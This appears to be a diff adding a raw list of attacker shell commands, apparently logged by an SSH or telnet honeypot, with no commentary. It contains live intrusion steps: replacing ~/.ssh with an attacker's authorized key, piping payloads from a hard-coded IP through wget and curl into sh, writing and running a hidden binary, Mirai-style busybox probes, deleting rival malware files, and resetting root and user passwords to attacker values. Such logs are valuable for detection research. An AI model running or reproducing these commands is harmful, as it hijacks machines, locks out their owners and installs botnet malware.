@@ -1,0 +1,82 @@
+cat /proc/cpuinfo | grep name | wc -l
+Enter new UNIX password:
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+which ls
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+sh
+enable
+shell
+debug shell
+cmd
+wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh
+cat /bin/echo
+cat /proc/mounts
+cp /bin/echo //.f && >//.f && echo -e '\x67\x6f\x6f\x64\x77\x72\x69\x74\x65' && chmod 777 //.f; echo -e '\x63\x6d\x64\x67\x6f\x74'
+cd //; wget http://2.58.149.116/spc -O- > .f; ./.f s.spc; >.f; echo test
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+rm -rf /var/tmp/dota*
+system
+cat /proc/mounts; /bin/busybox CWYKA
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox CWYKA
+tftp; wget; /bin/busybox CWYKA
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox CWYKA
+rm .s; exit
+cat /proc/mounts; /bin/busybox NIIGJ
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NIIGJ
+tftp; wget; /bin/busybox NIIGJ
+/bin/busybox NIIGJ
+uname -s -m
+cat /proc/mounts; /bin/busybox KAMSP
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KAMSP
+tftp; wget; /bin/busybox KAMSP
+/bin/busybox KAMSP
+cat /proc/cpuinfo | grep name | wc -l | head -c 30
+cat /proc/mounts; /bin/busybox AZYGC
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AZYGC
+tftp; wget; /bin/busybox AZYGC
+/bin/busybox AZYGC
+cat /proc/mounts; /bin/busybox ZYABS
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZYABS
+tftp; wget; /bin/busybox ZYABS
+/bin/busybox ZYABS
+cat /proc/mounts; /bin/busybox JEZFY
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JEZFY
+tftp; wget; /bin/busybox JEZFY
+/bin/busybox JEZFY
+(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
+cat /proc/mounts; /bin/busybox JKUDE
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JKUDE
+tftp; wget; /bin/busybox JKUDE
+/bin/busybox JKUDE
+cat /proc/mounts; /bin/busybox ZKWIE
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZKWIE
+tftp; wget; /bin/busybox ZKWIE
+/bin/busybox ZKWIE
+cat /proc/mounts; /bin/busybox YFERQ
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YFERQ
+tftp; wget; /bin/busybox YFERQ
+/bin/busybox YFERQ
+echo -e "daniele\nFoTyFszTbNxF\nFoTyFszTbNxF"|passwd|bash
+echo -e "fedena\na1YyOOsDJkse\na1YyOOsDJkse"|passwd|bash
+echo -e "ftp123456\nMUXLULjTw2il\nMUXLULjTw2il"|passwd|bash
+echo "daniele\nFoTyFszTbNxF\nFoTyFszTbNxF\n"|passwd
+echo "fedena\na1YyOOsDJkse\na1YyOOsDJkse\n"|passwd
+echo "ftp123456\nMUXLULjTw2il\nMUXLULjTw2il\n"|passwd
+echo "root:nBYv4usiy6Av"|chpasswd|bash
+echo "root:JpB3KbM1tlOx"|chpasswd|bash
+echo "root:IRrcgFYpih9V"|chpasswd|bash
+echo -e '\x79\x65\x73\x68\x65\x6c\x6f'
+echo "321" > /var/tmp/.var03522123
+echo "root nE7jA%5m" > /tmp/up.txt
